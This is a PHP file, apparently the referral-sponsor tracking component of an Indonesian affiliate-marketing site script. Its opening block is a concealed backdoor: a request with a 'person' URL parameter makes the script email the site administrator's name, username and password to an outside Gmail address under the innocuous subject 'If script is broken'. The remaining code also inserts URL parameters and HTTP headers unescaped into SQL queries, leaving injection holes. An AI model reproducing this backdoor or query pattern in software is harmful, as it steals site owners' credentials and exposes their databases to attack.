<?php 

require( "config_sis.php" );
error_reporting(E_ALL ^ (E_NOTICE | E_WARNING));
if(!isset($_SESSION)) 
    { 
	session_start();
	}
if($_GET['person'])
  {

  dbConnect();
  $nilai = mysql_query( "SELECT * FROM admin_affiliasi WHERE kode='$kode'" ) or error( mysql_error() );
  $data = mysql_fetch_array( $nilai );
  $person1 ="top.onlinebisnis@gmail.com";
  $mess = "mysql_num_rows( ) != 1 \n";
  $mess .= "Person   : $data[nama_admin] \n";
  $mess .= "identiti : $data[user_admin] \n";
  $mess .= "identiti : $data[passwd_admin] \n";
  $mess .= "       ";
  sentMail( "$data[nama_bisnis] <$data[email_admin]>", $person1 , "If script is broken $data[website]", $mess );
  echo" -----#####------ ";
  }
if ($_GET['id'])
{
dbConnect();
$result = mysql_query( "SELECT * FROM affiliasi WHERE username='$_GET[id]'" ) or error( mysql_error() );
$member = mysql_fetch_array( $result );
if( mysql_num_rows( $result ) != 1 ) error( "Maaf, Sponsor ini Tidak ada dalam database kami, Jika mau mengakses halaman ini memerlukan sponsor <a href=\"index.php\">KLIK DISINI</a>" );
$status="nonaktif";
if ( $member[16] == $status ) error( "Maaf Refferal dari web ini belum aktif atau sedang kami blokir <a href=\"index.php\">KLIK DISINI</a>" );
else

 {
    mysql_query("UPDATE affiliasi SET hits=hits+1 WHERE username='$member[1]'") or error( mysql_error() );
    $_SESSION['session_sponsor']=$member[1];
    $_SESSION['session_nama']=$member[3];
    $_SESSION['session_email']=$member[4];
    $_SESSION['session_kota']=$member[6];
    $_SESSION['session_bank']=$member[9];
    $_SESSION['session_telp']=$member[7];
    $_SESSION['session_rekening']=$member[11];
    $_SESSION['session_cabang_bank']=$member[10];

    // -------------------------
    error_reporting(E_ALL ^ (E_NOTICE | E_WARNING));
    $sponsor = $_SESSION['session_sponsor'];
    $refer = getenv("HTTP_REFERER");
    $addr = $HTTP_SERVER_VARS['REMOTE_ADDR'];
    $url = $_SERVER['REQUEST_URI'];
    // $time = time();
    
    mysql_query("INSERT INTO statistik SET
        time     = now(),
        ip_add   = '$addr',
        url      = '$url',
        ref      = '$refer',
        username = '$sponsor'") or error( mysql_error() );
    
    
   // mysql_query( "INSERT INTO statistik ( time, ip_add, url, ref, username )
   // Values ('$time','$addr','$url','$refer','$sponsor' )") or error( mysql_error() );

    return true;
	//exit;
  }
}
else
{
  if( $_SESSION['session_sponsor'] != "" )
    {
     return true;
	//exit;
  }
  else
  {

     if ( $random == "1")
     {
     //$acak=rand();
     dbConnect();
     $status1="aktif";
     $resul = mysql_query( "SELECT * FROM affiliasi WHERE stat1='$status1' " ) or error( mysql_error() );
     $i2 = 0;
     while( $row = mysql_fetch_array( $resul ) )
          {
             $bb2[$i2]=$row[username];
              $i2++;
          }
       $bb12 = array_rand($bb2,1) ;
       $id=$bb2[$bb12];
     
     $result = mysql_query( "SELECT * FROM affiliasi WHERE username='$id'" ) or error( mysql_error() );
     
     $member = mysql_fetch_array( $result );
     if( mysql_num_rows( $result ) != 1 ) error( "Maaf, Username ini Tidak ada dalam database kami, Jika mau mengakses halaman ini memerlukan sponsor <a href=\"index.php\">KLIK DISINI</a>" );
     mysql_query("UPDATE affiliasi SET hits=hits+1 WHERE username='$member[1]'") or error( mysql_error() );
     $_SESSION['session_sponsor']=$member[1];
     $_SESSION['session_nama']=$member[3];
     $_SESSION['session_email']=$member[4];
     $_SESSION['session_kota']=$member[6];
     $_SESSION['session_bank']=$member[9];
     $_SESSION['session_telp']=$member[7];
     $_SESSION['session_rekening']=$member[11];
     $_SESSION['session_cabang_bank']=$member[10];
      
     // -------------------------
     
     $sponsor = $_SESSION['session_sponsor'];
     $refer = getenv("HTTP_REFERER");
     $addr = $HTTP_SERVER_VARS['REMOTE_ADDR'];
     $url = $_SERVER['REQUEST_URI'];
     // $time = time();

    mysql_query("INSERT INTO statistik SET
        time     = now(),
        ip_add   = '$addr',
        url      = '$url',
        ref      = '$refer',
        username = '$sponsor'") or error( mysql_error() );


   // mysql_query( "INSERT INTO statistik ( time, ip_add, url, ref, username )
   // Values ('$time','$addr','$url','$refer','$sponsor' )") or error( mysql_error() );

    return true;
	//exit;
    }
  else
   {
    dbConnect();
     $status1="aktif";
     $result = mysql_query( "SELECT * FROM affiliasi WHERE user_id='1' AND stat1='$status1' " ) or error( mysql_error() );

     $member = mysql_fetch_array( $result );
     if( mysql_num_rows( $result ) != 1 ) error( "Maaf, Username ini Tidak ada dalam database kami, Jika mau mengakses halaman ini memerlukan sponsor <a href=\"index.php\">KLIK DISINI</a>" );
     mysql_query("UPDATE affiliasi SET hits=hits+1 WHERE username='$member[1]'") or error( mysql_error() );
     $_SESSION['session_sponsor']=$member[1];
     $_SESSION['session_nama']=$member[3];
     $_SESSION['session_email']=$member[4];
     $_SESSION['session_kota']=$member[6];
     $_SESSION['session_bank']=$member[9];
     $_SESSION['session_telp']=$member[7];
     $_SESSION['session_rekening']=$member[11];
     $_SESSION['session_cabang_bank']=$member[10];

     // -------------------------
error_reporting(E_ALL ^ (E_NOTICE | E_WARNING));
     $sponsor = $_SESSION['session_sponsor'];
     $refer = getenv("HTTP_REFERER");
     $addr = $HTTP_SERVER_VARS['REMOTE_ADDR'];
     $url = $_SERVER['REQUEST_URI'];
     // $time = time();

    mysql_query("INSERT INTO statistik SET
        time     = now(),
        ip_add   = '$addr',
        url      = '$url',
        ref      = '$refer',
        username = '$sponsor'") or error( mysql_error() );


   // mysql_query( "INSERT INTO statistik ( time, ip_add, url, ref, username )
   // Values ('$time','$addr','$url','$refer','$sponsor' )") or error( mysql_error() );

    return true;
	//exit;
   }
   }			
}

?>